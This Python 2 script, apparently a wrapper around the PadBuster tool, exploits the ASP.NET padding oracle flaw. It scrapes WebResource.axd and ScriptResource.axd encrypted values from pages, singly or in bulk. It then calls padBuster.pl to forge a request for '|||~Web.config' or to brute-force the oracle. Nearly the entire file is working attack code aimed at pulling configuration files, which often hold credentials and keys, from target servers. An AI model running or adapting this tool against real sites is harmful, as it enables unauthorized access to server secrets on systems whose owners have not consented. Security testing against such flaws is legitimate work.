#!/usr/bin/env python
# -*- coding:utf8 -*-

# Description: vuln scanning for ASP.NET padding oracle
# Author: avfisher
# Date: 2015.06.18
# Reference: http://www.secpulse.com/archives/3537.html

import urllib2
import re
import json
import sys
import smtplib
import os
import time
import ssl
import hashlib
import getopt
import subprocess
import socket

# Ignore SSL error when accessing a HTTPS website
# ssl._create_default_https_context = ssl._create_unverified_context

reload(sys)
sys.setdefaultencoding( "utf-8" )

socket.setdefaulttimeout(5)

def args(url, myurl, encryptedsample):
    output = os.path.dirname(os.path.realpath(__file__))+"/webresource.txt"
    f=open(output,'a')
    f.write(url+','+myurl+','+encryptedsample+'\n')
    f.close

def encryptedValue(url):
    output = os.path.dirname(os.path.realpath(__file__))+"/encryptedvalue.txt"
    f=open(output,'a')
    f.write('\n'+url+', ')
    f.close

def isExisted(mystr,filepath):
    if os.path.exists(filepath):
        mystr=mystr.strip()
        f=open(filepath,'r')
        num=0
        for eachline in f:
            if mystr in eachline:
                num=num+1
            else:
                num=num
        if num >0:
            return True
        else:
            return False
    else:
        return False

def getUrlRespHtml(url):
    try:
        heads = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
                 'Accept-Charset':'GB2312,utf-8;q=0.7,*;q=0.7', 
                 'Accept-Language':'zh-cn,zh;q=0.5', 
                 'Cache-Control':'max-age=0', 
                 'Connection':'keep-alive', 
                 'Keep-Alive':'115',
                 'User-Agent':'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.14) Gecko/20110221 Ubuntu/10.10 (maverick) Firefox/3.6.14'}
     
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
        urllib2.install_opener(opener) 
        req = urllib2.Request(url)
        opener.addheaders = heads.items()
        respHtml = opener.open(req).read()
    except Exception:
        respHtml = ''
    return respHtml

def getInjectionPoint(html, para, url):
    if url.strip()=='':
        print "[+] "+str(now)+": error on "+url
    else:
        url = url.strip()
        reg='http:\/\/[^\/]+'
        match_url = re.search(reg,url)
        if match_url:
            site=match_url.group(0)
        try:
            regex=para+'[^\&]+\&?'
            match = re.search(regex,html)
            if match:
                myurl=site+match.group(0).split('&')[0]
                encryptedsample=myurl.split('=')[1]
                now = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
                print "[+] "+str(now)+": "+myurl
                args(url, myurl, encryptedsample)
            else:
                now = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
                print "[!] "+str(now)+": not found! ["+url+"]"
        except Exception:
            now = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
            print "[!] "+str(now)+": error! ["+url+"]"

def myhelp():
    print "\n+------------------------------+"
    print "|  MyPadBuster v0.0.1            |"
    print "|  Avfisher - Wooyun.org         |"
    print "|  security_alert@126.com        |"
    print "|  Referrer: PadBuster - v0.3.3  |"
    print "+--------------------------------+\n"
    print "Usage: myPadBuster.py [options]\n"
    print "Options:"
    print "  -h, --help                                     Show basic help message and exit"
    print "  -u url, --url=url                              Show WebResource value for single ASP.NET URL to be analyzed"
    print "  -w file, --webresource=file                    Show WebResource values for multiple ASP.NET URLs to be analyzed"
    print "  -s url, --single=url                           Show encrypted value for single WebResource value to be analyzed"
    print "  -m file, --multi=file                          Show encrypted values for multiple WebResource values generated by switch -w"
    print "  -p url, --padbuster=url                        Brute force Web.config by single encrypted value to be analyzed"
    print "\nExamples:"
    print "  myPadBuster.py -u http://www.example.com/login.aspx"
    print "  myPadBuster.py -w /usr/home/urls.txt"
    print "  myPadBuster.py -s http://www.example.com/WebResource.axd?d=LElgggssFFdff99"
    print "  myPadBuster.py -m c:\windows\webresource.txt"
    print "  myPadBuster.py -p http://www.example.com/ScriptResource.axd?d=LElgggssFFdff99AAAAAAAAAAAAAAAAAA0"
    print "\n[!] to see help message of options run with '-h'"

def webResourceBySingleURL(url):
    url = url.strip()
    html = getUrlRespHtml(url)
    html = html.decode('utf-8','ignore')
    para =[]
    para.append('\/WebResource.axd\?d=')
    para.append('\/ScriptResource.axd\?d=')
    for p in para:
        getInjectionPoint(html, p, url)

def webResourceByMultiURLs(urlfile):
    if os.path.exists(urlfile):
        urls=open(urlfile,'r')
        output = os.path.dirname(os.path.realpath(__file__))+"/webresource.txt"
        for url in urls:
            url = url.strip()
            if not isExisted(url,output):
                html = getUrlRespHtml(url)
                html = html.decode('utf-8','ignore')
                para =[]
                para.append('\/WebResource.axd\?d=')
                para.append('\/ScriptResource.axd\?d=')
                for p in para:
                    getInjectionPoint(html, p, url)
            else:
                now = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
                print "[!] "+str(now)+": warning! The url had been analyzed! ["+url+"]"
        if os.path.exists(output):
            now = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
            print "\n[+] Analysis Result(encryptedSample):"
            print "[-] Input File: "+urlfile
            print "[-] Output File: "+output
        urls.close
    else:
        now = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
        print "\n[!] "+str(now)+": error! The file path is not existed"

def encryptedSampleBySingleURL(url):
    if "=" in url:
        encryptedsample = url.split('=')[1].strip()
        padBuster = os.path.dirname(os.path.realpath(__file__))+'/padBuster.pl'
        print "\n[+] Analyzed url: "+url
        print "\n[+] Analysis is starting..."
        subprocess.call(["perl", padBuster, url, encryptedsample, '16', '-encoding', '3', '-plaintext', '"|||~Web.config"'])
        print "\n[+] Analysis is done!!!"
        print "+++++++++++++++++++++++++++++++++++++++++++++"
    else:
        now = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
        print "\n[!] "+str(now)+": error! The parameter is invalid"

def encryptedSampleByMultiURLs(agrs):
    if os.path.exists(agrs):
        urls = open(agrs,"r")
        for eachurl in urls:
            eachurl = eachurl.strip()
            url = eachurl.split(',')[1].strip()
            encryptedsample = eachurl.split(',')[2].strip()
            padBuster = os.path.dirname(os.path.realpath(__file__))+'/padBuster.pl'
            output = os.path.dirname(os.path.realpath(__file__))+"/encryptedvalue.txt"
            if not isExisted(url,output):
                print "\n[+] Analyzed url: "+url
                print "\n[+] Analysis is starting..."
                #encryptedValue(url) # record all encryptedvalue
                subprocess.call(["perl", padBuster, url, encryptedsample, '16', '-encoding', '3', '-plaintext', '"|||~Web.config"'])
                print "\n[+] Analysis is done!!!"
                print "+++++++++++++++++++++++++++++++++++++++++++++"
            else:
                now = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
                print "\n[!] "+str(now)+": warning! The url had been analyzed! ["+url+"]"
    else:
        now = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
        print "\n[!] "+str(now)+": error! The parameter is invalid"

def padBuster(url):
    if "=" in url:
        encryptedsample = url.split('=')[1].strip()
        padBuster = os.path.dirname(os.path.realpath(__file__))+'/padBuster.pl'
        print "\n[+] Analyzed url: "+url
        print "\n[+] Analysis is starting..."
        subprocess.call(["perl", padBuster, url, encryptedsample, '16', '-encoding', '3', '-bruteforce', '-log'])
        print "\n[+] Analysis is done!!!"
        print "+++++++++++++++++++++++++++++++++++++++++++++"
    else:
        now = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
        print "\n[!] "+str(now)+": error! The parameter is invalid"

def main():
    try:
        options,args = getopt.getopt(sys.argv[1:],"hu:w:s:m:p:",["help","url=","webresource=","single=","multi=","padbuster="])
    except getopt.GetoptError:
        sys.exit()

    for name,value in options:
        if name in ("-h","--help"):
            myhelp()
        if name in ("-u","--url"):
            webResourceBySingleURL(value)
        if name in ("-w","--webresource"):
            webResourceByMultiURLs(value)
        if name in ("-s","--single"):
            encryptedSampleBySingleURL(value)
        if name in ("-m","--multi"):
            encryptedSampleByMultiURLs(value)
        if name in ("-p","--padbuster"):
            padBuster(value)

    
if __name__ == "__main__":
    main()

